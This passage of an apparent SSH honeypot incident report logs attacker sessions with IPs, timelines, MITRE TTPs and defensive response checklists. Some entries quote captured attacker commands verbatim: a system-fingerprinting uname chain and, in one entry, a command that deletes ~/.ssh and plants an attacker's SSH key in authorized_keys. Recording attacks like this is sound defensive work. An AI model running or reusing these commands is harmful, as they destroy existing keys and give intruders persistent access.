| `2026-07-12 14:08:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.114.93[.]153` to AbuseIPDB if not already reported
- [ ] Block `181.114.93[.]153` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bf74b2823a9

| Field | Detail |
|---|---|
| **Source IP** | `182.151.45[.]136` |
| **First Seen** | 2026-07-12 14:08 |
| **Last Seen** | 2026-07-12 14:08 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:08:39` | `cowrie.session.connect` |
| `2026-07-12 14:08:40` | `cowrie.client.version` |
| `2026-07-12 14:08:40` | `cowrie.client.kex` |
| `2026-07-12 14:08:44` | `cowrie.login.success` |
| `2026-07-12 14:08:46` | `cowrie.direct-tcpip.request` |
| `2026-07-12 14:08:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.151.45[.]136` to AbuseIPDB if not already reported
- [ ] Block `182.151.45[.]136` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-813320bb3fea

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-12 14:09 |
| **Last Seen** | 2026-07-12 14:09 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:09:41` | `cowrie.session.connect` |
| `2026-07-12 14:09:41` | `cowrie.client.version` |
| `2026-07-12 14:09:41` | `cowrie.client.kex` |
| `2026-07-12 14:09:44` | `cowrie.login.success` |
| `2026-07-12 14:09:46` | `cowrie.session.params` |
| `2026-07-12 14:09:46` | `cowrie.command.input` |
| `2026-07-12 14:09:46` | `cowrie.log.closed` |
| `2026-07-12 14:09:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d338c4c3a682

| Field | Detail |
|---|---|
| **Source IP** | `74.82.47[.]4` |
| **First Seen** | 2026-07-12 14:11 |
| **Last Seen** | 2026-07-12 14:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:110.0) Gecko/20100101 Firefox/110.0, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:11:24` | `cowrie.session.connect` |
| `2026-07-12 14:11:24` | `cowrie.login.success` |
| `2026-07-12 14:11:24` | `cowrie.session.params` |
| `2026-07-12 14:11:24` | `cowrie.command.input` |
| `2026-07-12 14:11:24` | `cowrie.command.input` |
| `2026-07-12 14:11:24` | `cowrie.command.failed` |
| `2026-07-12 14:11:24` | `cowrie.command.input` |
| `2026-07-12 14:11:24` | `cowrie.command.failed` |
| `2026-07-12 14:11:24` | `cowrie.command.input` |
| `2026-07-12 14:11:24` | `cowrie.log.closed` |
| `2026-07-12 14:11:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `74.82.47[.]4` to AbuseIPDB if not already reported
- [ ] Block `74.82.47[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-101e3e5d9625

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-12 14:12 |
| **Last Seen** | 2026-07-12 14:12 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:12:01` | `cowrie.session.connect` |
| `2026-07-12 14:12:02` | `cowrie.client.version` |
| `2026-07-12 14:12:02` | `cowrie.client.kex` |
| `2026-07-12 14:12:04` | `cowrie.login.success` |
| `2026-07-12 14:12:06` | `cowrie.session.params` |
| `2026-07-12 14:12:06` | `cowrie.command.input` |
| `2026-07-12 14:12:06` | `cowrie.command.input` |
| `2026-07-12 14:12:06` | `cowrie.command.input` |
| `2026-07-12 14:12:06` | `cowrie.command.input` |
| `2026-07-12 14:12:06` | `cowrie.command.input` |
| `2026-07-12 14:12:06` | `cowrie.command.success` |
| `2026-07-12 14:12:06` | `cowrie.command.input` |
| `2026-07-12 14:12:06` | `cowrie.command.input` |
| `2026-07-12 14:12:06` | `cowrie.command.input` |
| `2026-07-12 14:12:06` | `cowrie.command.input` |
| `2026-07-12 14:12:07` | `cowrie.log.closed` |
| `2026-07-12 14:12:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5069b4c62b36

| Field | Detail |
|---|---|
| **Source IP** | `112.120.115[.]152` |
| **First Seen** | 2026-07-12 14:13 |
| **Last Seen** | 2026-07-12 14:13 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:13:46` | `cowrie.session.connect` |
| `2026-07-12 14:13:47` | `cowrie.client.version` |
| `2026-07-12 14:13:47` | `cowrie.client.kex` |
| `2026-07-12 14:13:49` | `cowrie.login.success` |
| `2026-07-12 14:13:50` | `cowrie.direct-tcpip.request` |
| `2026-07-12 14:13:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.120.115[.]152` to AbuseIPDB if not already reported
- [ ] Block `112.120.115[.]152` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-892f1fbee917

| Field | Detail |
|---|---|
| **Source IP** | `182.60.128[.]241` |
| **First Seen** | 2026-07-12 14:13 |
| **Last Seen** | 2026-07-12 14:14 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:13:56` | `cowrie.session.connect` |
| `2026-07-12 14:13:57` | `cowrie.client.version` |
| `2026-07-12 14:13:57` | `cowrie.client.kex` |
| `2026-07-12 14:13:58` | `cowrie.login.success` |
| `2026-07-12 14:13:59` | `cowrie.direct-tcpip.request` |
| `2026-07-12 14:14:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.60.128[.]241` to AbuseIPDB if not already reported
- [ ] Block `182.60.128[.]241` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc76e762d5b0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-12 14:14 |
| **Last Seen** | 2026-07-12 14:14 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:14:36` | `cowrie.session.connect` |
| `2026-07-12 14:14:36` | `cowrie.client.version` |
| `2026-07-12 14:14:36` | `cowrie.client.kex` |
| `2026-07-12 14:14:39` | `cowrie.login.success` |
| `2026-07-12 14:14:41` | `cowrie.session.params` |
| `2026-07-12 14:14:41` | `cowrie.command.input` |
| `2026-07-12 14:14:41` | `cowrie.command.input` |
| `2026-07-12 14:14:41` | `cowrie.command.input` |
| `2026-07-12 14:14:41` | `cowrie.command.input` |
| `2026-07-12 14:14:41` | `cowrie.command.input` |
| `2026-07-12 14:14:41` | `cowrie.command.success` |
| `2026-07-12 14:14:41` | `cowrie.command.input` |
| `2026-07-12 14:14:41` | `cowrie.command.input` |
| `2026-07-12 14:14:41` | `cowrie.command.input` |
| `2026-07-12 14:14:41` | `cowrie.command.input` |
| `2026-07-12 14:14:41` | `cowrie.log.closed` |
| `2026-07-12 14:14:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55657f57a164

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-12 14:15 |
| **Last Seen** | 2026-07-12 14:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:15:01` | `cowrie.session.connect` |
| `2026-07-12 14:15:01` | `cowrie.client.version` |
| `2026-07-12 14:15:01` | `cowrie.client.kex` |
| `2026-07-12 14:15:01` | `cowrie.login.success` |
| `2026-07-12 14:15:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc5378264288

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-12 14:15 |
| **Last Seen** | 2026-07-12 14:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:15:02` | `cowrie.session.connect` |
| `2026-07-12 14:15:02` | `cowrie.client.version` |
| `2026-07-12 14:15:02` | `cowrie.client.kex` |
| `2026-07-12 14:15:02` | `cowrie.login.success` |
| `2026-07-12 14:15:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd4ed965d94d

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-12 14:15 |
| **Last Seen** | 2026-07-12 14:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:15:05` | `cowrie.session.connect` |
| `2026-07-12 14:15:05` | `cowrie.client.version` |
| `2026-07-12 14:15:05` | `cowrie.client.kex` |
| `2026-07-12 14:15:06` | `cowrie.login.success` |
| `2026-07-12 14:15:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-078e8274622d

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-12 14:15 |
| **Last Seen** | 2026-07-12 14:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:15:06` | `cowrie.session.connect` |
| `2026-07-12 14:15:06` | `cowrie.client.version` |
| `2026-07-12 14:15:06` | `cowrie.client.kex` |
| `2026-07-12 14:15:07` | `cowrie.login.success` |
| `2026-07-12 14:15:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16c54034ca36

| Field | Detail |
|---|---|
| **Source IP** | `69.74.29[.]21` |
| **First Seen** | 2026-07-12 14:16 |
| **Last Seen** | 2026-07-12 14:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:16:58` | `cowrie.session.connect` |
| `2026-07-12 14:16:58` | `cowrie.client.version` |
| `2026-07-12 14:16:58` | `cowrie.client.kex` |
| `2026-07-12 14:16:58` | `cowrie.login.success` |
| `2026-07-12 14:16:58` | `cowrie.session.params` |
| `2026-07-12 14:16:58` | `cowrie.command.input` |
| `2026-07-12 14:16:58` | `cowrie.command.failed` |
| `2026-07-12 14:16:58` | `cowrie.log.closed` |
| `2026-07-12 14:16:59` | `cowrie.session.params` |
| `2026-07-12 14:16:59` | `cowrie.command.input` |
| `2026-07-12 14:16:59` | `cowrie.session.file_download` |
| `2026-07-12 14:16:59` | `cowrie.log.closed` |
| `2026-07-12 14:16:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.74.29[.]21` to AbuseIPDB if not already reported
- [ ] Block `69.74.29[.]21` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b16b4912c3b7

| Field | Detail |
|---|---|
| **Source IP** | `69.74.29[.]21` |
| **First Seen** | 2026-07-12 14:16 |
| **Last Seen** | 2026-07-12 14:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:16:59` | `cowrie.session.connect` |
| `2026-07-12 14:16:59` | `cowrie.client.version` |
| `2026-07-12 14:16:59` | `cowrie.client.kex` |
| `2026-07-12 14:16:59` | `cowrie.login.success` |
| `2026-07-12 14:16:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.74.29[.]21` to AbuseIPDB if not already reported
- [ ] Block `69.74.29[.]21` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f1d6d34118c

| Field | Detail |
|---|---|
| **Source IP** | `69.74.29[.]21` |
| **First Seen** | 2026-07-12 14:16 |
| **Last Seen** | 2026-07-12 14:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:16:59` | `cowrie.session.connect` |
| `2026-07-12 14:16:59` | `cowrie.client.version` |
| `2026-07-12 14:16:59` | `cowrie.client.kex` |
| `2026-07-12 14:16:59` | `cowrie.login.success` |
| `2026-07-12 14:16:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.74.29[.]21` to AbuseIPDB if not already reported
- [ ] Block `69.74.29[.]21` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5b5291db2f9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-12 14:17 |
| **Last Seen** | 2026-07-12 14:17 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:17:19` | `cowrie.session.connect` |
| `2026-07-12 14:17:20` | `cowrie.client.version` |
| `2026-07-12 14:17:20` | `cowrie.client.kex` |
| `2026-07-12 14:17:23` | `cowrie.login.success` |
| `2026-07-12 14:17:24` | `cowrie.session.params` |
| `2026-07-12 14:17:24` | `cowrie.command.input` |
| `2026-07-12 14:17:24` | `cowrie.command.input` |
| `2026-07-12 14:17:24` | `cowrie.command.input` |
| `2026-07-12 14:17:24` | `cowrie.command.input` |
| `2026-07-12 14:17:24` | `cowrie.command.input` |
| `2026-07-12 14:17:24` | `cowrie.command.success` |
| `2026-07-12 14:17:24` | `cowrie.command.input` |
| `2026-07-12 14:17:24` | `cowrie.command.input` |
| `2026-07-12 14:17:24` | `cowrie.command.input` |
| `2026-07-12 14:17:24` | `cowrie.command.input` |
| `2026-07-12 14:17:25` | `cowrie.log.closed` |
| `2026-07-12 14:17:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-947d048be58f

| Field | Detail |
|---|---|
| **Source IP** | `103.251.143[.]14` |
| **First Seen** | 2026-07-12 14:19 |
| **Last Seen** | 2026-07-12 14:19 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:19:13` | `cowrie.session.connect` |
| `2026-07-12 14:19:13` | `cowrie.client.version` |
| `2026-07-12 14:19:13` | `cowrie.client.kex` |
| `2026-07-12 14:19:15` | `cowrie.login.success` |
| `2026-07-12 14:19:16` | `cowrie.direct-tcpip.request` |
| `2026-07-12 14:19:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.251.143[.]14` to AbuseIPDB if not already reported
- [ ] Block `103.251.143[.]14` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bca838d4e4b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-12 14:20 |
| **Last Seen** | 2026-07-12 14:20 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:20:02` | `cowrie.session.connect` |
| `2026-07-12 14:20:02` | `cowrie.client.version` |
| `2026-07-12 14:20:02` | `cowrie.client.kex` |
| `2026-07-12 14:20:05` | `cowrie.login.success` |
| `2026-07-12 14:20:07` | `cowrie.session.params` |
| `2026-07-12 14:20:07` | `cowrie.command.input` |
| `2026-07-12 14:20:07` | `cowrie.command.input` |
| `2026-07-12 14:20:07` | `cowrie.command.input` |
| `2026-07-12 14:20:07` | `cowrie.command.input` |
| `2026-07-12 14:20:07` | `cowrie.command.input` |
| `2026-07-12 14:20:07` | `cowrie.command.success` |
| `2026-07-12 14:20:07` | `cowrie.command.input` |
| `2026-07-12 14:20:07` | `cowrie.command.input` |
| `2026-07-12 14:20:07` | `cowrie.command.input` |
| `2026-07-12 14:20:07` | `cowrie.command.input` |
| `2026-07-12 14:20:07` | `cowrie.log.closed` |
| `2026-07-12 14:20:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d4f16345489

| Field | Detail |
|---|---|
| **Source IP** | `51.75.200[.]186` |
| **First Seen** | 2026-07-12 14:21 |
| **Last Seen** | 2026-07-12 14:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:21:21` | `cowrie.session.connect` |
| `2026-07-12 14:21:21` | `cowrie.client.version` |
| `2026-07-12 14:21:21` | `cowrie.client.kex` |
| `2026-07-12 14:21:21` | `cowrie.login.success` |
| `2026-07-12 14:21:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.75.200[.]186` to AbuseIPDB if not already reported
- [ ] Block `51.75.200[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5400f8b44749

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-12 14:22 |
| **Last Seen** | 2026-07-12 14:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:22:31` | `cowrie.session.connect` |
| `2026-07-12 14:22:31` | `cowrie.client.version` |
| `2026-07-12 14:22:31` | `cowrie.client.kex` |
| `2026-07-12 14:22:33` | `cowrie.login.success` |
| `2026-07-12 14:22:34` | `cowrie.session.params` |
| `2026-07-12 14:22:34` | `cowrie.command.input` |
| `2026-07-12 14:22:34` | `cowrie.command.input` |
| `2026-07-12 14:22:34` | `cowrie.command.input` |
| `2026-07-12 14:22:34` | `cowrie.command.input` |
| `2026-07-12 14:22:34` | `cowrie.command.input` |
| `2026-07-12 14:22:34` | `cowrie.command.success` |
| `2026-07-12 14:22:34` | `cowrie.command.input` |
| `2026-07-12 14:22:34` | `cowrie.command.input` |
| `2026-07-12 14:22:34` | `cowrie.command.input` |
| `2026-07-12 14:22:34` | `cowrie.command.input` |
| `2026-07-12 14:22:35` | `cowrie.log.closed` |
| `2026-07-12 14:22:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-711d954a09e8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-12 14:24 |
| **Last Seen** | 2026-07-12 14:25 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
